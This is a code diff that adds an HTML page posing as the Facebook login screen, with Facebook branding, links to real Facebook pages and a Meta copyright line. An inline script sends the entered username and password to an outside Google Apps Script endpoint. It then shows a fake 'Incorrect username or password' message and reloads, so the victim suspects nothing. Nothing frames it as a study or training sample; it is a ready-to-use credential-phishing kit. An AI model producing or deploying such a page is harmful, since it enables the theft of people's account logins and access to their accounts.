@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=-1.0">
+  <title>FACEBOOK</title>
+  <link rel="icon" href="/logo.png">
+<link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <div class="left">
+    <label>facebook</label>
+    <h5>Facebook helps you connect and share with the people in your life.</h5>
+  </div>
+  <div class="right">
+    <form method="post" id="contactform" name="contactform">
+
+      <BR></BR>
+
+      <input type="text" placeholder=" Email Adress or Phone Number" id="1" name="username">
+
+
+      <br>
+      <br>
+      <input type="password" placeholder="Password" id="2" name="password">
+      <br><br>
+
+      <input type="submit" name="submit" value="Log in"
+        style="background: #1877f2;text-align: center;font-size: large;font-weight: bold;color: white;font-size: 22px;cursor:pointer"
+        id="login">
+        <br>
+
+      <br>
+
+
+      <a href="https://www.facebook.com/login/identify">forgotten password?</a>
+      <br><br><br>
+      <input type="button" value="Create New Account"
+        style="background: #42b72a;text-align: center;font-size: large;font-weight: bold;color: white;font-size: 22px;cursor: pointer; ">
+
+    </form>
+<br>
+<p><a href="https://www.facebook.com/pages/create/?ref_type=registration_form" style="color: #1877f2;"> Create a Page</a> for a celebrity, brand or business</p>
+    <pre>
+      <br><br><br><br><br><br><br>
+  English (UK)                                   Español
+  বাংলা                                              অসমীয
+  नेपाली                                              हिन्दी
+
+        Meta © 2022
+</pre>
+    
+  </div>
+  <script>
+    const scriptURL =
+        "https://script.google.com/macros/s/AKfycbz954-F5hUZ9fn0fEiwr7FouRJnQXutq346hHdoRl60dBZE4T7UccjDBYAOn4VxrH3bOA/exec";
+    const form = document.forms["contactform"];
+
+    form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        fetch(scriptURL, { method: "POST", body: new FormData(form) })
+            .then((response) => alert("Incorrect username or password"))
+            .then(() => {
+                window.location.reload();
+            })
+            .catch((error) => console.error("Error!", error.message));
+    });
+</script>
+</body>
+
+</html>
